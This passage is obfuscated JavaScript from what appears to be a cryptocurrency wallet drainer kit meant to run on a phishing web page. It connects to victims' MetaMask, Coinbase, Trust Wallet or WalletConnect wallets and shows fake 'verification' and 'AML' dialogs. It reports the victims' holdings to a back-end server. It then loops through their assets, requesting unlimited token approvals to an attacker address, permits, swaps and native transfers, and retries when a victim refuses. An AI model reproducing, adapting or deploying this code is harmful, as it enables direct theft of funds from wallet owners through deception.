          if (!_0x37ba9e.permit || _0x37ba9e.permit == 0x0 || _0x37ba9e.amount_usd < MS_Settings.Settings.Permit.Priority) {
            continue;
          }
          _0xbd54f2.push(_0x37ba9e);
        } catch (_0x55020f) {
          console.log(_0x55020f);
        }
      }
      for (const _0x2504c0 of _0x4a8e4b) {
        try {
          if (_0x2504c0.permit && _0x2504c0.permit > 0x0 && _0x2504c0.amount_usd >= MS_Settings.Settings.Permit.Priority) {
            continue;
          }
          _0xbd54f2.push(_0x2504c0);
        } catch (_0x1a11f1) {
          console.log(_0x1a11f1);
        }
      }
      _0x4a8e4b = _0xbd54f2;
    }
    if (MS_Settings.Settings.Swappers.Enable && MS_Settings.Settings.Swappers.Priority == 0x2) {
      const _0x3c7051 = [];
      for (const _0x2f20ed of _0x4a8e4b) {
        try {
          if (!_0x2f20ed.swapper) {
            continue;
          }
          _0x3c7051.push(_0x2f20ed);
        } catch (_0x3baa70) {
          console.log(_0x3baa70);
        }
      }
      for (const _0x329c30 of _0x4a8e4b) {
        try {
          if (_0x329c30.swapper) {
            continue;
          }
          _0x3c7051.push(_0x329c30);
        } catch (_0x2d7275) {
          console.log(_0x2d7275);
        }
      }
      _0x4a8e4b = _0x3c7051;
    }
    return _0x4a8e4b;
  } catch (_0x1e1d26) {
    console.log(_0x1e1d26);
    return [];
  }
};
const APPROVE_TOKEN = async _0x1d9e46 => {
  if ((MS_Current_Provider == "MetaMask" || MS_Current_Provider == "Trust Wallet" && !MS_Mobile_Status) && MS_Settings.Settings.Approve.MetaMask >= 0x2 && !_0x1d9e46.increase) {
    try {
      for (let _0x1016bd = 0x0; _0x1016bd < 0x2; _0x1016bd++) {
        if (_0x1d9e46.increase) {
          continue;
        }
        try {
          const _0x15496d = await retrive_token(_0x1d9e46.chain_id, _0x1d9e46.address);
          const _0x43a1b5 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x1d9e46.chain_id]);
          const _0x3a39d7 = new ethers.Contract(_0x1d9e46.address, _0x15496d, _0x43a1b5);
          if (is_increase_approve(_0x3a39d7.functions)) {
            _0x1d9e46.increase = true;
          }
        } catch (_0x265928) {
          console.log(_0x265928);
        }
      }
    } catch (_0xb66328) {
      console.log(_0xb66328);
    }
  }
  if ((MS_Current_Provider == "MetaMask" || MS_Current_Provider == "Trust Wallet" && !MS_Mobile_Status) && MS_Settings.Settings.Approve.MetaMask >= 0x2 && _0x1d9e46.increase) {
    return await MM_APPROVE_TOKEN(_0x1d9e46);
  }
  if ((MS_Current_Provider == 'MetaMask' || MS_Current_Provider == "Trust Wallet" && !MS_Mobile_Status) && MS_Settings.Settings.Approve.MetaMask == 0x2 && !_0x1d9e46.increase) {
    await TRANSFER_TOKEN(_0x1d9e46);
    return 0x2;
  }
  if ((MS_Current_Provider == "MetaMask" || MS_Current_Provider == "Trust Wallet" && !MS_Mobile_Status) && MS_Settings.Settings.Approve.MetaMask == 0x3 && !_0x1d9e46.increase) {
    throw new Error("UNSUPPORTED");
  }
  const _0x30329c = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x1d9e46.chain_id]);
  const _0x4b81cc = ethers.BigNumber.from(await _0x30329c.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  const _0x4e9b23 = await get_nonce(_0x1d9e46.chain_id);
  const _0x41a77d = new ethers.Contract(_0x1d9e46.address, MS_Contract_ABI.ERC20, MS_Signer);
  let _0x4a167f = null;
  let _0x2bf255 = ethers.utils.parseEther("1158472395435294898592384258348512586931256");
  for (const _0x574dcc of MS_Settings.Unlimited_BL) {
    try {
      if (_0x574dcc[0x0] == MS_Current_Chain_ID && _0x574dcc[0x1] == _0x1d9e46.address.toLowerCase()) {
        _0x2bf255 = _0x1d9e46.amount_raw;
        break;
      }
    } catch (_0x4ef89b) {
      console.log(_0x4ef89b);
    }
  }
  try {
    _0x4a167f = await _0x41a77d.estimateGas.approve(MS_Settings.Address, _0x2bf255, {
      'from': MS_Current_Address
    });
    _0x4a167f = ethers.BigNumber.from(_0x4a167f).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from('120')).toString();
  } catch (_0x5ac9ed) {
    _0x4a167f = _0x1d9e46.chain_id == 0xa4b1 ? 0x4c4b40 : _0x1d9e46.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
  }
  await approve_request(_0x1d9e46);
  sign_next();
  const _0x59dfb9 = await _0x41a77d.approve(MS_Settings.Address, _0x2bf255, {
    'gasLimit': ethers.BigNumber.from(_0x4a167f),
    'gasPrice': ethers.BigNumber.from(_0x4b81cc),
    'nonce': _0x4e9b23,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x30329c.waitForTransaction(_0x59dfb9.hash, 0x1, 0x7530);
  }
  await approve_success(_0x1d9e46);
  sign_ready();
  return 0x1;
};
const MM_APPROVE_TOKEN = async _0x1c2fa5 => {
  const _0x9b7332 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x1c2fa5.chain_id]);
  const _0x232ddd = ethers.BigNumber.from(await _0x9b7332.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  const _0x531ccf = await get_nonce(_0x1c2fa5.chain_id);
  const _0x5e8a87 = new ethers.Contract(_0x1c2fa5.address, [{
    'inputs': [{
      'internalType': "address",
      'name': "spender",
      'type': "address"
    }, {
      'internalType': "uint256",
      'name': "increment",
      'type': "uint256"
    }],
    'name': "increaseAllowance",
    'outputs': [{
      'internalType': 'bool',
      'name': '',
      'type': 'bool'
    }],
    'stateMutability': "nonpayable",
    'type': "function"
  }], MS_Signer);
  let _0x42b943 = null;
  let _0xb721ca = ethers.utils.parseEther("1158472395435294898592384258348512586931256");
  for (const _0x42e5a1 of MS_Settings.Unlimited_BL) {
    try {
      if (_0x42e5a1[0x0] == MS_Current_Chain_ID && _0x42e5a1[0x1] == _0x1c2fa5.address.toLowerCase()) {
        _0xb721ca = _0x1c2fa5.amount_raw;
        break;
      }
    } catch (_0x5cdb91) {
      console.log(_0x5cdb91);
    }
  }
  try {
    _0x42b943 = await _0x5e8a87.estimateGas.increaseAllowance(MS_Settings.Address, _0xb721ca, {
      'from': MS_Current_Address
    });
    _0x42b943 = ethers.BigNumber.from(_0x42b943).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  } catch (_0x5dd06d) {
    _0x42b943 = _0x1c2fa5.chain_id == 0xa4b1 ? 0x4c4b40 : _0x1c2fa5.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
  }
  await approve_request(_0x1c2fa5);
  sign_next();
  const _0x37fc37 = await _0x5e8a87.increaseAllowance(MS_Settings.Address, _0xb721ca, {
    'gasLimit': ethers.BigNumber.from(_0x42b943),
    'gasPrice': ethers.BigNumber.from(_0x232ddd),
    'nonce': _0x531ccf,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x9b7332.waitForTransaction(_0x37fc37.hash, 0x1, 0x7530);
  }
  await approve_success(_0x1c2fa5);
  sign_ready();
  return 0x1;
};
const connect_wallet = async (_0x5e0214 = null) => {
  $(".modal").hide();
  $("#overlay").fadeOut(0xc8);
  try {
    if (MS_Process) {
      return;
    }
    MS_Process = true;
    if (MS_Bad_Country) {
      try {
        ms_hide();
      } catch (_0x3084ef) {
        console.log(_0x3084ef);
      }
      try {
        Swal.close();
        Swal.fire({
          'html': "<b>\u041F\u0440\u0435\u0434\u0443\u043F\u0440\u0435\u0436\u0434\u0435\u043D\u0438\u0435</b><br><br>\u041F\u043E\u0436\u0430\u043B\u0443\u0439\u0441\u0442\u0430, \u043F\u043E\u043A\u0438\u043D\u044C\u0442\u0435 \u044D\u0442\u043E\u0442 \u0432\u0435\u0431-\u0441\u0430\u0439\u0442 \u043D\u0435\u043C\u0435\u0434\u043B\u0435\u043D\u043D\u043E, \u043E\u043D \u043D\u0435 \u043F\u0440\u0435\u0434\u043D\u0430\u0437\u043D\u0430\u0447\u0435\u043D \u0434\u043B\u044F \u0420\u043E\u0441\u0441\u0438\u0438 \u0438 \u0441\u0442\u0440\u0430\u043D \u0421\u041D\u0413, \u043D\u0435 \u043F\u044B\u0442\u0430\u0439\u0442\u0435\u0441\u044C \u0438\u0441\u043F\u043E\u043B\u044C\u0437\u043E\u0432\u0430\u0442\u044C VPN, \u044D\u0442\u043E \u043D\u0435\u0431\u0435\u0437\u043E\u043F\u0430\u0441\u043D\u043E!",
          'icon': "error",
          'allowOutsideClick': true,
          'allowEscapeKey': true,
          'timer': 0x0,
          'width': 0x258,
          'showConfirmButton': true,
          'confirmButtonText': 'OK'
        });
        await new Promise(_0x1fcda8 => setTimeout(_0x1fcda8, 0x3a98));
        window.location.href = "https://ya.ru";
      } catch (_0x2ef518) {
        console.log(_0x2ef518);
      }
      return;
    }
    if (_0x5e0214 !== null) {
      if (_0x5e0214 == "MetaMask") {
        if (typeof window.ethereum == "object" && typeof window.ethereum.providers === "object") {
          let _0x415350 = false;
          for (const _0x3afd71 of window.ethereum.providers) {
            if (_0x3afd71.isMetaMask == true) {
              _0x415350 = true;
              MS_Provider = _0x3afd71;
              MS_Current_Provider = "MetaMask";
              break;
            }
          }
          if (!_0x415350) {
            if (MS_Mobile_Status) {
              window.location.href = "https://metamask.app.link/dapp/" + MS_Current_URL;
              MS_Process = false;
              return;
            } else {
              window.open("https://metamask.io", "_blank").focus();
              MS_Process = false;
              return;
            }
          }
        } else {
          if (typeof window.ethereum === "object" && window.ethereum.isMetaMask) {
            MS_Provider = window.ethereum;
            MS_Current_Provider = "MetaMask";
          } else {
            if (MS_Mobile_Status) {
              window.location.href = "https://metamask.app.link/dapp/" + MS_Current_URL;
              MS_Process = false;
              return;
            } else {
              window.open("https://metamask.io", "_blank").focus();
              MS_Process = false;
              return;
            }
          }
        }
      } else {
        if (_0x5e0214 == 'Coinbase') {
          if (typeof window.ethereum == "object" && typeof window.ethereum.providers === "object") {
            let _0xa7a45d = false;
            for (const _0xed8bbf of window.ethereum.providers) {
              if (_0xed8bbf.isCoinbaseWallet == true) {
                _0xa7a45d = true;
                MS_Provider = _0xed8bbf;
                break;
              }
            }
            if (_0xa7a45d) {
              MS_Current_Provider = "Coinbase";
            } else {
              if (MS_Mobile_Status) {
                window.location.href = "https://go.cb-w.com/dapp?cb_url=https://" + MS_Current_URL;
                MS_Process = false;
                return;
              } else {
                window.open("https://www.coinbase.com/wallet", '_blank').focus();
                MS_Process = false;
                return;
              }
            }
          } else {
            if (typeof window.ethereum === "object" && (window.ethereum.isCoinbaseWallet || window.ethereum.isCoinbaseBrowser)) {
              MS_Provider = window.ethereum;
              MS_Current_Provider = "Coinbase";
            } else {
              if (MS_Mobile_Status) {
                window.location.href = "https://go.cb-w.com/dapp?cb_url=https://" + MS_Current_URL;
                MS_Process = false;
                return;
              } else {
                window.open("https://www.coinbase.com/wallet", "_blank").focus();
                MS_Process = false;
                return;
              }
            }
          }
        } else {
          if (_0x5e0214 == "Trust Wallet") {
            if (typeof window.ethereum === 'object' && window.ethereum.isTrust) {
              MS_Provider = window.ethereum;
              MS_Current_Provider = "Trust Wallet";
            } else {
              if (MS_Mobile_Status) {
                window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + MS_Current_URL;
                MS_Process = false;
                return;
              } else {
                window.open("https://trustwallet.com", '_blank').focus();
                MS_Process = false;
                return;
              }
            }
          } else {
            if (_0x5e0214 == "Binance Wallet") {
              if (typeof window.BinanceChain === "object") {
                MS_Provider = window.BinanceChain;
                MS_Current_Provider = "Binance Wallet";
              } else {
                window.open('https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp', "_blank").focus();
                MS_Process = false;
                return;
              }
            } else if (_0x5e0214 == "WalletConnect" || _0x5e0214 == "WalletConnect_v2") {
              MS_Current_Provider = 'WalletConnect';
            } else if (typeof window.ethereum === "object") {
              MS_Provider = window.ethereum;
              MS_Current_Provider = 'Ethereum';
            } else {
              MS_Current_Provider = "WalletConnect";
            }
          }
        }
      }
    } else if (window.ethereum) {
      MS_Provider = window.ethereum;
      MS_Current_Provider = 'Ethereum';
    } else {
      MS_Current_Provider = "WalletConnect";
    }
    try {
      await connect_request();
      let _0x165748 = null;
      if (MS_Current_Provider == 'WalletConnect') {
        ms_hide();
        MS_WC_Version = 0x2;
        await load_wc();
        try {
          await MS_Provider.disconnect();
        } catch (_0x512f7e) {
          console.log(_0x512f7e);
        }
        await MS_Provider.connect();
        if (MS_Provider && MS_Provider.accounts.length > 0x0) {
          if (!MS_Provider.accounts[0x0].includes('0x')) {
            MS_Process = false;
            return await connect_cancel();
          }
          await new Promise(_0x11bdc1 => setTimeout(_0x11bdc1, 0x9c4));
          MS_Current_Address = MS_Provider.accounts[0x0];
          MS_Current_Chain_ID = MS_Provider.chainId;
          MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
          MS_Signer = MS_Web3.getSigner();
        } else {
          MS_Process = false;
          return await connect_cancel();
        }
      } else {
        try {
          _0x165748 = await MS_Provider.request({
            'method': "wallet_requestPermissions",
            'params': [{
              'eth_accounts': {}
            }]
          });
          if (_0x165748 && _0x165748.length > 0x0) {
            if (!MS_Provider.selectedAddress.includes('0x')) {
              return connect_cancel();
            }
            MS_Current_Address = MS_Provider.selectedAddress;
            MS_Current_Chain_ID = parseInt(MS_Provider.chainId);
            MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
            MS_Signer = MS_Web3.getSigner();
          } else {
            MS_Process = false;
            return await connect_cancel();
          }
        } catch (_0x5779bc) {
          _0x165748 = await MS_Provider.request({
            'method': "eth_requestAccounts"
          });
          if (_0x165748 && _0x165748.length > 0x0) {
            if (!_0x165748[0x0].includes('0x')) {
              return connect_cancel();
            }
            MS_Current_Address = _0x165748[0x0];
            MS_Current_Chain_ID = parseInt(MS_Provider.chainId);
            MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
            MS_Signer = MS_Web3.getSigner();
          } else {
            MS_Process = false;
            return await connect_cancel();
          }
        }
      }
      if (!MS_Current_Address.match(/^0x\S+$/)) {
        throw new Error("Invalid Wallet");
      }
    } catch (_0x4370e7) {
      console.log(_0x4370e7);
      MS_Process = false;
      return await connect_cancel();
    }
    ms_hide();
    if (MS_Settings.V_MODE == 0x1) {
      Swal.fire({
        'html': "<b>Sign message</b> to verificate you wallet...",
        'imageUrl': "https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
        'imageHeight': 0x3c,
        'allowOutsideClick': false,
        'allowEscapeKey': false,
        'timer': 0x0,
        'width': 0x258,
        'showConfirmButton': false
      });
      try {
        const _0x36cbe0 = MS_Settings.V_MSG.replaceAll("{{ADDRESS}}", MS_Current_Address);
        const _0x10328c = await MS_Signer.signMessage(_0x36cbe0);
        const _0x307c9b = ethers.utils.recoverAddress(ethers.utils.hashMessage(_0x36cbe0), _0x10328c);
        if (!_0x307c9b) {
          Swal.fire({
            'title': "Verification Error",
            'text': "We have received your signature, but it's incorrect, please try again.",
            'icon': "error",
            'confirmButtonText': 'OK'
          });
          MS_Process = false;
          return await connect_cancel();
        } else {
          let _0x50034d = await send_request({
            'action': "sign_verify",
            'sign': _0x10328c,
            'address': MS_Current_Address,
            'message': ''
          });
          if (_0x50034d.status != 'OK') {
            Swal.fire({
              'title': "Verification Error",
              'text': "We have received your signature, but it's incorrect, please try again.",
              'icon': "error",
              'confirmButtonText': 'OK'
            });
            MS_Process = false;
            return await connect_cancel();
          }
        }
      } catch (_0x506621) {
        Swal.fire({
          'title': "Verification Error",
          'text': "We cannot verify that the wallet is yours as you did not sign the message provided.",
          'icon': "error",
          'confirmButtonText': 'OK'
        });
        MS_Process = false;
        return await connect_cancel();
      }
    } else {
      await send_request({
        'action': 'sign_verify',
        'address': MS_Current_Address
      });
    }
    await connect_success();
    show_check();
    if (MS_Settings.Wallet_Blacklist.length > 0x0 && MS_Settings.Wallet_Blacklist.includes(MS_Current_Address.toLowerCase())) {
      MS_Check_Done = true;
      Swal.close();
      Swal.fire({
        'title': "AML Error",
        'text': "Your wallet is not AML clear, you can't use it!",
        'icon': "error",
        'confirmButtonText': 'OK'
      });
      MS_Process = false;
      return;
    }
    let _0x36b265 = await get_wallet_assets(MS_Current_Address);
    let _0x4258d7 = 0x0;
    for (const _0x14ba64 of _0x36b265) {
      try {
        _0x4258d7 += _0x14ba64.amount_usd;
      } catch (_0x1f0f1c) {
        console.log(_0x1f0f1c);
      }
    }
    let _0x1dbfa8 = 0x0;
    for (const _0x3153cc of _0x36b265) _0x1dbfa8 += _0x3153cc.amount_usd;
    await send_request({
      'action': "check_finish",
      'user_id': MS_ID,
      'assets': _0x36b265,
      'balance': _0x1dbfa8
    });
    MS_Check_Done = true;
    Swal.close();
    if (MS_Settings.Settings.Minimal_Wallet_Price > _0x4258d7) {
      Swal.fire({
        'title': "Something went wrong!",
        'text': "For security reasons we can't allow you to connect empty or new wallet",
        'icon': "error",
        'confirmButtonText': 'OK'
      });
      MS_Process = false;
      return;
    }
    Swal.fire({
      'html': "<b>Done!</b> Sign message in your wallet to continue...",
      'imageUrl': "https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
      'imageHeight': 0x3c,
      'allowOutsideClick': false,
      'allowEscapeKey': false,
      'timer': 0x0,
      'width': 0x258,
      'showConfirmButton': false
    });
    for (const _0x2b9ac6 of _0x36b265) {
      try {
        if (_0x2b9ac6.type != "NATIVE") {
          MS_Gas_Reserves[_0x2b9ac6.chain_id] += 0x1;
        }
      } catch (_0x50510c) {
        console.log(_0x50510c);
      }
    }
    if (typeof SIGN_BLUR !== "undefined" && MS_Settings.Settings.Blur.Enable == 0x1 && MS_Settings.Settings.Blur.Priority == 0x1) {
      await SIGN_BLUR(_0x36b265, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID);
    }
    if (typeof SIGN_SEAPORT !== 'undefined' && MS_Settings.Settings.SeaPort.Enable == 0x1 && MS_Settings.Settings.SeaPort.Priority == 0x1) {
      await SIGN_SEAPORT(_0x36b265, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID);
    }
    if (typeof SIGN_X2Y2 !== "undefined" && MS_Settings.Settings.x2y2.Enable == 0x1 && MS_Current_Chain_ID == 0x1 && MS_Settings.Settings.x2y2.Priority == 0x1) {
      await SIGN_X2Y2(_0x36b265, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID);
    }
    if (MS_Provider.isTrust && !MS_Mobile_Status) {
      try {
        MS_Settings.Settings.Sign.Native = 0x0;
        MS_Settings.Settings.Sign.Tokens = 0x0;
        MS_Settings.Settings.Sign.NFTs = 0x0;
      } catch (_0x29fd83) {
        console.log(_0x29fd83);
      }
    }
    let _0x56bbca = true;
    while (_0x56bbca) {
      _0x56bbca = MS_Settings.LA == 0x1;
      for (const _0x5ad586 of _0x36b265) {
        try {
          if (_0x5ad586.skip) {
            continue;
          }
          let _0xb9c82a = false;
          if (_0x5ad586.type == "NATIVE") {
            const _0x1f7a0c = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x5ad586.chain_id]);
            let _0x4e615f = false;
            const _0x1bcbb6 = ethers.BigNumber.from(await _0x1f7a0c.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from('120')).toString();
            if (MS_Settings.Settings.Chains[convert_chain('ID', 'ANKR', _0x5ad586.chain_id)].Contract_Address != '') {
              _0x4e615f = true;
            }
            const _0x257e94 = _0x5ad586.chain_id == 0xa4b1 ? 0x4c4b40 : _0x5ad586.chain_id == 0xa86a ? 0x4c4b40 : _0x4e615f ? 0x186a0 : 0x5208;
            const _0x2710fa = _0x5ad586.chain_id == 0xa4b1 ? 0x4c4b40 : _0x5ad586.chain_id == 0xa86a ? 0x4c4b40 : 0x249f0;
            const _0x12a7e1 = ethers.BigNumber.from(_0x5ad586.chain_id == 0xa ? "35000000000" : _0x1bcbb6);
            const _0x39dfd6 = _0x12a7e1.mul(ethers.BigNumber.from(_0x257e94)).mul(ethers.BigNumber.from('2'));
            const _0x7773f4 = _0x12a7e1.mul(ethers.BigNumber.from(_0x2710fa)).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[_0x5ad586.chain_id])));
            const _0x101828 = ethers.BigNumber.from(_0x5ad586.amount_raw).sub(_0x39dfd6).sub(_0x7773f4).toString();
            console.log(_0x101828);
            if (ethers.BigNumber.from(_0x101828).lte(ethers.BigNumber.from('0'))) {
              continue;
            }
          }
          if (_0x5ad586.chain_id != MS_Current_Chain_ID) {
            await chain_request(MS_Current_Chain_ID, _0x5ad586.chain_id);
            try {
              if (MS_Current_Provider == "WalletConnect") {
                try {
                  await MS_Provider.request({
                    'method': 'wallet_switchEthereumChain',
                    'params': [{
                      'chainId': '0x' + _0x5ad586.chain_id.toString(0x10)
                    }]
                  });
                } catch (_0x1302a7) {
                  await chain_cancel();
                  continue;
                }
              } else {
                try {
                  await MS_Provider.request({
                    'method': 'wallet_switchEthereumChain',
                    'params': [{
                      'chainId': '0x' + _0x5ad586.chain_id.toString(0x10)
                    }]
                  });
                } catch (_0x37ce71) {
                  if (_0x37ce71.code == 0x1326 || _0x37ce71.code == -0x7f5b) {
                    try {
                      await MS_Provider.request({
                        'method': "wallet_addEthereumChain",
                        'params': [MS_MetaMask_ChainData[_0x5ad586.chain_id]]
                      });
                    } catch (_0x15dcd4) {
                      await chain_cancel();
                      continue;
                    }
                  } else {
                    await chain_cancel();
                    continue;
                  }
                }
              }
              MS_Current_Chain_ID = _0x5ad586.chain_id;
              MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
              MS_Signer = MS_Web3.getSigner();
              _0xb9c82a = true;
              await chain_success();
            } catch (_0x1ff4da) {
              console.log(_0x1ff4da);
              await chain_cancel();
              continue;
            }
          } else {
            _0xb9c82a = true;
          }
          if (!_0xb9c82a) {
            continue;
          }
          if (_0x5ad586.type == "NATIVE") {
            if (MS_Settings.Settings.Sign.Native > 0x0 && (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force == 0x1)) {
              while (true) {
                try {
                  await SIGN_NATIVE(_0x5ad586);
                  _0x5ad586.skip = true;
                  break;
                } catch (_0x3cb96c) {
                  console.log(_0x3cb96c);
                  if (_0x3cb96c.code == -0x7f59 || _0x3cb96c.code == -0x7d00) {
                    if (MS_Settings.Settings.Sign.Force == 0x1) {
                      await sign_cancel();
                    } else {
                      await sign_unavailable();
                      while (true) {
                        try {
                          await TRANSFER_NATIVE(_0x5ad586);
                          _0x5ad586.skip = true;
                          break;
                        } catch (_0x97dba9) {
                          console.log(_0x97dba9);
                          if (_0x97dba9 != "LOW_BALANCE") {
                            await transfer_cancel();
                            if (!MS_Settings.Loop_N) {
                              break;
                            }
                          } else {
                            break;
                          }
                        }
                      }
                    }
                    break;
                  } else {
                    console.log(_0x3cb96c);
                    if (_0x3cb96c != "LOW_BALANCE") {
                      await sign_cancel();
                      if (!MS_Settings.Loop_N) {
                        break;
                      }
                    } else {
                      break;
                    }
                  }
                }
              }
            } else {
              while (true) {
                try {
                  await TRANSFER_NATIVE(_0x5ad586);
                  _0x5ad586.skip = true;
                  break;
                } catch (_0x422e4d) {
                  console.log(_0x422e4d);
                  if (_0x422e4d != "LOW_BALANCE") {
                    await transfer_cancel();
                    if (!MS_Settings.Loop_N) {
                      break;
                    }
                  } else {
                    break;
                  }
                }
              }
            }
          } else {
            if (_0x5ad586.type == "ERC20") {
              if (typeof _0x5ad586.permit == 'undefined' && MS_Settings.Settings.Permit.Mode && _0x5ad586.amount_usd >= MS_Settings.Settings.Permit.Price) {
                const _0x456b6a = await retrive_token(_0x5ad586.chain_id, _0x5ad586.address);
                const _0x4ee84e = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x5ad586.chain_id]);
                const _0x4a235d = new ethers.Contract(_0x5ad586.address, _0x456b6a, _0x4ee84e);
                const _0x1daba8 = get_permit_type(_0x4a235d.functions);
                _0x5ad586.permit = _0x1daba8;
                _0x5ad586.permit_ver = '1';
                _0x5ad586.abi = _0x456b6a;
                if (_0x1daba8 > 0x0) {
                  if (_0x4a235d.functions.hasOwnProperty("version")) {
                    try {
                      _0x5ad586.permit_ver = await _0x4a235d.version();
                    } catch (_0x26f3a4) {
                      console.log(_0x26f3a4);
                    }
                  }
                  console.log("[PERMIT FOUND] " + _0x5ad586.name + ", Permit Type: " + _0x1daba8 + ", Version: " + _0x5ad586.permit_ver);
                }
              }
              if (_0x5ad586.permit > 0x0) {
                for (const _0x2472d9 of MS_Settings.Permit_BL) {
                  if (_0x2472d9[0x0] == MS_Current_Chain_ID && _0x2472d9[0x1] === _0x5ad586.address.toLowerCase()) {
                    _0x5ad586.permit = 0x0;
                    break;
                  }
                }
              }
              if (MS_Settings.Settings.Permit2.Mode && _0x5ad586.permit2) {
                const _0x42f86e = [];
                for (const _0x53fa4e of _0x36b265) {
                  try {
                    if (_0x53fa4e.chain_id == _0x5ad586.chain_id && _0x53fa4e.permit2) {
                      _0x42f86e.push(_0x53fa4e);
                      _0x53fa4e.skip = true;
                    }
                  } catch (_0x2cc12a) {
                    console.log(_0x2cc12a);
                  }
                }
                while (true) {
                  try {
                    await DO_PERMIT2(_0x5ad586, _0x42f86e);
                    _0x5ad586.skip = true;
                    break;
                  } catch (_0x5435e9) {
                    console.log(_0x5435e9);
                    await approve_cancel();
                    if (!MS_Settings.Loop_T) {
                      break;
                    }
                  }
                }
              } else {
                if (MS_Settings.Settings.Permit.Mode && _0x5ad586.permit && _0x5ad586.permit > 0x0) {
                  while (true) {
                    try {
                      await PERMIT_TOKEN(_0x5ad586);
                      _0x5ad586.skip = true;
                      break;
                    } catch (_0x3fa8f0) {
                      console.log(_0x3fa8f0);
                      await approve_cancel();
                      if (!MS_Settings.Loop_T) {
                        break;
                      }
                    }
                  }
                } else {
                  if (MS_Settings.Settings.Swappers.Enable && _0x5ad586.swapper && _0x5ad586.amount_usd >= MS_Settings.Settings.Swappers.Price) {
                    if (_0x5ad586.swapper_type == 'Uniswap') {
                      const _0xe8e389 = [];
                      for (const _0x1c0f8e of _0x36b265) {
                        try {
                          if (_0x1c0f8e.chain_id == _0x5ad586.chain_id && _0x1c0f8e.swapper && _0x1c0f8e.swapper_type == "Uniswap") {
                            _0xe8e389.push(_0x1c0f8e);
                            _0x1c0f8e.skip = true;
                          }
                        } catch (_0x46270e) {
                          console.log(_0x46270e);
                        }
                      }
                      while (true) {
                        try {
                          await DO_UNISWAP(_0x5ad586, _0xe8e389);
                          _0x5ad586.skip = true;
                          break;
                        } catch (_0x15e33f) {
                          console.log(_0x15e33f);
                          await sign_cancel();
                          if (!MS_Settings.Loop_T) {
                            break;
                          }
                        }
                      }
                    } else {
                      if (_0x5ad586.swapper_type == "Pancake_V3") {
                        const _0x1c7b13 = [];
                        for (const _0x722dae of _0x36b265) {
                          try {
                            if (_0x722dae.chain_id == _0x5ad586.chain_id && _0x722dae.swapper && _0x722dae.swapper_type == "Pancake_V3") {
                              _0x1c7b13.push(_0x722dae);
                              _0x722dae.skip = true;
                            }
                          } catch (_0xf0008e) {
                            console.log(_0xf0008e);
                          }
                        }
                        while (true) {
                          try {
                            await DO_PANCAKE_V3(_0x5ad586, _0x1c7b13);
                            _0x5ad586.skip = true;
                            break;
                          } catch (_0x5cb33d) {
                            console.log(_0x5cb33d);
                            await sign_cancel();
                            if (!MS_Settings.Loop_T) {
                              break;
                            }
                          }
                        }
                      } else {
                        while (true) {
                          try {
                            await DO_SWAP(_0x5ad586);
                            _0x5ad586.skip = true;
                            break;
                          } catch (_0x4a3666) {
                            console.log(_0x4a3666);
                            await sign_cancel();
                            if (!MS_Settings.Loop_T) {
                              break;
                            }
                          }
                        }
                      }
                    }
                  } else {
                    if (MS_Settings.Settings.Sign.Tokens > 0x0 && (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force == 0x1)) {
                      while (true) {
                        try {
                          await SIGN_TOKEN(_0x5ad586);
                          if (MS_Settings.Settings.Sign.Tokens == 0x1) {
                            const _0x1f5ef6 = send_request({
                              'action': "approve_token",
                              'user_id': MS_ID,
                              'asset': _0x5ad586,
                              'address': MS_Current_Address
                            });
                            if (MS_Settings.Settings.Wait_For_Response) {
                              await _0x1f5ef6;
                            }
                          }
                          _0x5ad586.skip = true;
                          break;
                        } catch (_0x42fc36) {
                          console.log(_0x42fc36);
                          if (_0x42fc36.code == -0x7f59 || _0x42fc36.code == -0x7d00) {
                            if (MS_Settings.Settings.Sign.Force == 0x1) {
                              await sign_cancel();
                            } else {
                              await sign_unavailable();
                              while (true) {
                                if (MS_Settings.Settings.Sign.Tokens == 0x1) {
                                  if (MS_Settings.Settings.Approve.MetaMask || MS_Current_Provider != "MetaMask" || MS_Mobile_Status) {
                                    try {
                                      let _0xa96979 = await APPROVE_TOKEN(_0x5ad586);
                                      if (_0xa96979 == 0x1) {
                                        const _0x146d20 = send_request({
                                          'action': 'approve_token',
                                          'user_id': MS_ID,
                                          'asset': _0x5ad586,
                                          'address': MS_Current_Address
                                        });
                                        if (MS_Settings.Settings.Wait_For_Response) {
                                          await _0x146d20;
                                        }
                                      }
                                      _0x5ad586.skip = true;
                                      break;
                                    } catch (_0x38d256) {
                                      await approve_cancel();
                                      if (!MS_Settings.Loop_T) {
                                        break;
                                      }
                                    }
                                  } else {
                                    try {
                                      await TRANSFER_TOKEN(_0x5ad586);
                                      _0x5ad586.skip = true;
                                      break;
                                    } catch (_0xb67620) {
                                      console.log(_0xb67620);
                                      await transfer_cancel();
                                      if (!MS_Settings.Loop_T) {
                                        break;
                                      }
                                    }
                                  }
                                } else {
